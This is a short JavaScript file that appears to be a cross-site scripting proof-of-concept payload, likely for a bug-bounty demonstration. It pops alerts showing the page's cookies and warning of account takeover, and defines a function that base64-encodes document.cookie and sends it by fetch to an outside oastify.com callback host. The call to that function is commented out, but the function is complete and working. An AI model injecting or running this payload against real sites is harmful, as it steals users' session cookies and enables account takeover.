
alert(document.cookie);
alert("Your account will be takeover by attacker with cookies stolen.");
function stealCookies(){
  const url = 'https://5v19oyskrzoib0d4jwe3rklp9gf730zoo.oastify.com/?cookies=' + btoa(document.cookie)
  const response = fetch(url)
}

function getCookie(cname)
{
  var name = cname + "=";
  var ca = document.cookie.split(';');
  for(var i=0; i<ca.length; i++) 
  {
    var c = ca[i].trim();
    if (c.indexOf(name)==0) return c.substring(name.length,c.length);
  }
  return "";
}
//stealCookies();
